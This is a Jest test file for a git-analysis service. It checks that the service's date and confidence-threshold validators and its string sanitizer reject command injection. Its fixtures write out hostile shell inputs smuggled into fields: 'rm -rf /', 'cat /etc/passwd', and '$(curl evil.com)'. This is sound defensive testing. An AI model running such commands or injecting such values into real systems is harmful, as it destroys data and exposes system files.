import { describe, it, expect, beforeEach } from '@jest/globals';
import { GitIntegratedProgressService } from '../services/gitIntegratedProgress.js';
import { 
  GitSinceDateSchema, 
  ConfidenceThresholdSchema, 
  sanitizeGitSinceDate,
  sanitizeConfidenceThreshold,
  sanitizeString
} from '../../shared/gitValidation.js';

/**
 * Security tests for Git integration to prevent command injection attacks
 * These tests ensure that all user inputs are properly validated and sanitized
 */
describe('Git Security Tests', () => {
  let gitService: GitIntegratedProgressService;

  beforeEach(() => {
    gitService = GitIntegratedProgressService.getInstance();
  });

  describe('Input Validation Tests', () => {
    describe('GitSinceDateSchema validation', () => {
      it('should accept valid predefined time periods', () => {
        const validPeriods = [
          '1 hour ago',
          '1 day ago', 
          '1 week ago',
          '1 month ago',
          '1 year ago'
        ];

        validPeriods.forEach(period => {
          expect(() => GitSinceDateSchema.parse(period)).not.toThrow();
        });
      });

      it('should accept valid ISO date formats', () => {
        const validDates = [
          '2025-01-01',
          '2024-12-31',
          '2023-06-15'
        ];

        validDates.forEach(date => {
          expect(() => GitSinceDateSchema.parse(date)).not.toThrow();
        });
      });

      it('should reject command injection attempts', () => {
        const maliciousInputs = [
          '1 week ago; rm -rf /',
          '1 month ago && cat /etc/passwd',
          '1 day ago | curl evil.com',
          '"; rm -rf /*; echo "',
          '$(rm -rf /)',
          '`rm -rf /`',
          '1 week ago\n rm -rf /',
          '1 month ago\r\n curl evil.com'
        ];

        maliciousInputs.forEach(input => {
          expect(() => GitSinceDateSchema.parse(input)).toThrow();
        });
      });

      it('should reject invalid date formats', () => {
        const invalidDates = [
          'invalid-date',
          '2025-13-01', // Invalid month
          '2025-01-32', // Invalid day
          '1999-01-01', // Too old
          '2031-01-01', // Too far in future
          ''
        ];

        invalidDates.forEach(date => {
          expect(() => GitSinceDateSchema.parse(date)).toThrow();
        });
      });
    });

    describe('ConfidenceThresholdSchema validation', () => {
      it('should accept valid confidence thresholds', () => {
        const validThresholds = [0, 50, 70, 100];

        validThresholds.forEach(threshold => {
          expect(() => ConfidenceThresholdSchema.parse(threshold)).not.toThrow();
        });
      });

      it('should reject invalid confidence thresholds', () => {
        const invalidThresholds = [-1, 101, 999, -999];

        invalidThresholds.forEach(threshold => {
          expect(() => ConfidenceThresholdSchema.parse(threshold)).toThrow();
        });
      });
    });
  });

  describe('Sanitization Function Tests', () => {
    describe('sanitizeGitSinceDate', () => {
      it('should sanitize valid inputs correctly', () => {
        expect(sanitizeGitSinceDate('1 week ago')).toBe('1 week ago');
        expect(sanitizeGitSinceDate('2025-01-01')).toBe('2025-01-01');
      });

      it('should reject and throw on malicious inputs', () => {
        const maliciousInputs = [
          '1 week ago; rm -rf /',
          '"; cat /etc/passwd; echo "',
          '$(malicious_command)',
          '`malicious_command`'
        ];

        maliciousInputs.forEach(input => {
          expect(() => sanitizeGitSinceDate(input)).toThrow();
        });
      });
    });

    describe('sanitizeConfidenceThreshold', () => {
      it('should sanitize valid inputs correctly', () => {
        expect(sanitizeConfidenceThreshold('50')).toBe(50);
        expect(sanitizeConfidenceThreshold(75)).toBe(75);
      });

      it('should reject invalid confidence values', () => {
        expect(() => sanitizeConfidenceThreshold('-1')).toThrow();
        expect(() => sanitizeConfidenceThreshold('101')).toThrow();
        expect(() => sanitizeConfidenceThreshold('invalid')).toThrow();
      });
    });

    describe('sanitizeString', () => {
      it('should remove dangerous characters', () => {
        expect(sanitizeString('normal string')).toBe('normal string');
        expect(sanitizeString('string; rm -rf /')).toBe('string rm -rf /');
        expect(sanitizeString('string && malicious')).toBe('string  malicious');
        expect(sanitizeString('string | pipe')).toBe('string  pipe');
        expect(sanitizeString('string `backticks`')).toBe('string backticks');
        expect(sanitizeString('string $(command)')).toBe('string command');
      });
    });
  });

  describe('Git Service Security Tests', () => {
    it('should handle invalid since dates gracefully', async () => {
      // Test that the service properly validates inputs before processing
      try {
        await gitService.analyzeGitHistory({
          sinceDate: '1 week ago; rm -rf /',
          enableSavings: false
        });
        // If it doesn't throw, the validation isn't working
        expect(true).toBe(false); // Force failure
      } catch (error) {
        // Should throw a validation error, not execute malicious command
        expect(error instanceof Error).toBe(true);
        expect(error.message).toContain('Invalid');
      }
    });

    it('should properly validate configuration objects', async () => {
      const maliciousConfig = {
        sinceDate: '"; rm -rf /*; echo "',
        enableSavings: false,
        confidenceThreshold: 150 // Invalid threshold
      };

      try {
        await gitService.analyzeGitHistory(maliciousConfig);
        expect(true).toBe(false); // Force failure if no error thrown
      } catch (error) {
        expect(error instanceof Error).toBe(true);
      }
    });

    it('should safely handle git status operations', async () => {
      // Test that git status doesn't execute arbitrary commands
      const status = await gitService.getGitStatus();
      expect(typeof status).toBe('string');
      // Should not contain command injection artifacts
      expect(status).not.toContain(';');
      expect(status).not.toContain('&&');
      expect(status).not.toContain('|');
    });

    it('should safely handle git branch operations', async () => {
      // Test that git branch doesn't execute arbitrary commands
      const branch = await gitService.getCurrentBranch();
      expect(typeof branch).toBe('string');
      // Should not contain command injection artifacts
      expect(branch).not.toContain(';');
      expect(branch).not.toContain('&&');
      expect(branch).not.toContain('|');
    });
  });

  describe('Edge Cases and Error Handling', () => {
    it('should handle extremely long inputs', () => {
      const longString = 'a'.repeat(1000);
      expect(() => sanitizeString(longString)).not.toThrow();
      
      // But should reject malicious long strings
      const maliciousLongString = ('a'.repeat(50) + '; rm -rf /').repeat(10);
      expect(sanitizeString(maliciousLongString)).not.toContain(';');
    });

    it('should handle unicode and special characters safely', () => {
      const unicodeString = 'test 测试 🚀';
      expect(() => sanitizeString(unicodeString)).not.toThrow();
      
      // But should still remove dangerous characters
      const mixedString = 'test 测试; rm -rf /';
      expect(sanitizeString(mixedString)).not.toContain(';');
    });

    it('should handle empty and null inputs', () => {
      expect(() => sanitizeGitSinceDate('')).toThrow();
      expect(sanitizeString('')).toBe('');
    });
  });

  describe('Command Line Interface Security', () => {
    it('should validate CLI options properly', () => {
      // Test that CLI validation schemas work correctly
      const validOptions = {
        since: '1 week ago',
        json: false,
        savings: true,
        confidenceThreshold: '50',
        savingsOnly: false
      };

      // Should not throw for valid options
      expect(() => {
        // This would be called in the CLI handler
        const validated = {
          since: sanitizeGitSinceDate(validOptions.since),
          confidenceThreshold: sanitizeConfidenceThreshold(validOptions.confidenceThreshold)
        };
      }).not.toThrow();
    });

    it('should reject malicious CLI options', () => {
      const maliciousOptions = {
        since: '1 week ago; curl evil.com',
        confidenceThreshold: '50; rm -rf /'
      };

      expect(() => sanitizeGitSinceDate(maliciousOptions.since)).toThrow();
      expect(() => sanitizeConfidenceThreshold(maliciousOptions.confidenceThreshold)).toThrow();
    });
  });
});

/**
 * Integration test to ensure the entire security pipeline works
 */
describe('End-to-End Security Integration', () => {
  it('should prevent command injection through the entire pipeline', async () => {
    const gitService = GitIntegratedProgressService.getInstance();
    
    // Attempt various injection vectors
    const injectionAttempts = [
      { sinceDate: '1 week ago; curl evil.com' },
      { sinceDate: '"; rm -rf /*; echo "' },
      { sinceDate: '$(curl evil.com)' },
      { sinceDate: '`rm -rf /`' }
    ];

    for (const attempt of injectionAttempts) {
      try {
        await gitService.analyzeGitHistory(attempt);
        // If this doesn't throw, our security is broken
        expect(true).toBe(false);
      } catch (error) {
        // Should catch validation errors, not system errors
        expect(error instanceof Error).toBe(true);
        expect(error.message).toContain('Invalid');
      }
    }
  });

  it('should maintain functionality while preventing attacks', async () => {
    const gitService = GitIntegratedProgressService.getInstance();
    
    // Test that legitimate usage still works
    const result = await gitService.analyzeGitHistory({
      sinceDate: '1 week ago',
      enableSavings: false
    });

    expect(result).toBeDefined();
    expect(typeof result.totalCommits).toBe('number');
    expect(Array.isArray(result.categories)).toBe(true);
    expect(Array.isArray(result.topContributors)).toBe(true);
  });
});